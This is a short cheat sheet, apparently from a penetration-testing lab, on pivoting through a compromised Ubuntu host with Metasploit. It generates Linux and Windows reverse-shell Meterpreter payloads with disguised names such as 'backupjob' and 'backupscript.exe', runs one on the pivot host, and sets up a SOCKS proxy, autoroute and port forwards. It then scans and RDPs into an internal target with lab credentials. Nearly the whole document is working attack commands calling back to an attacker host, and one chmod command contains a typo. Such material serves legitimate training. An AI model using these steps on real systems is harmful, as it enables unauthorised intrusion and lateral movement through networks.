---
legal-banner: true
---

### **Meterpreter Tunneling & Port Forwarding**

This section covers the essential commands and steps for setting up Meterpreter port forwarding.  
It assumes you already have a Meterpreter shell on an Ubuntu server (pivot host) and want to perform enumeration scans through this host.  

### **Creating Payload for Ubuntu Pivot Host**

1. Generate payload:  
   ```bash
   msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=8080 -f elf -o backupjob
   ```

2. Start multi/handler:  
   ```bash
   msf6 > use exploit/multi/handler
   msf6 exploit(multi/handler) > set LHOST 0.0.0.0
   msf6 exploit(multi/handler) > set LPORT 8080
   msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
   msf6 exploit(multi/handler) > run
   ```

3. Copy and execute payload on pivot host:  
   ```bash
   chmod `x backupjob && ./backupjob
   ```

4. Verify Meterpreter session:  
   ```bash
   meterpreter > pwd
   ```

### **Configuring MSF SOCKS Proxy**

1. Start SOCKS proxy:  
   ```bash
   msf6 > use auxiliary/server/socks_proxy
   msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
   msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
   msf6 auxiliary(server/socks_proxy) > set VERSION 4a
   msf6 auxiliary(server/socks_proxy) > run
   ```

2. Add entry to proxychains.conf:  
   ```bash
   socks4 127.0.0.1 9050
   ```

3. Create routes with AutoRoute:  
   ```bash
   msf6 > use post/multi/manage/autoroute
   msf6 post(multi/manage/autoroute) > set SESSION 1
   msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
   msf6 post(multi/manage/autoroute) > run
   ```

### **Testing Proxy & Routing Functionality**

1. Run an Nmap scan:  
   ```bash
   proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
   ```

2. Set up local port forwarding:  
   ```bash
   meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
   ```

3. Connect to the target:  
   ```bash
   xfreerdp /v:localhost:3300 /u:victor /p:pass@123
   ```

4. View active connections with netstat:  
   ```bash
   netstat -antp
   ```

### **Reverse Port Forwarding**

1. Add a reverse port forward:  
   ```bash
   meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
   ```

2. Start multi/handler:  
   ```bash
   msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
   msf6 exploit(multi/handler) > set LPORT 8081
   msf6 exploit(multi/handler) > set LHOST 0.0.0.0
   msf6 exploit(multi/handler) > run
   ```

3. Generate Windows payload:  
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 LPORT=1234 -f exe -o backupscript.exe
   ```

4. Establish a Meterpreter session:  
   ```bash
   meterpreter > shell
   ```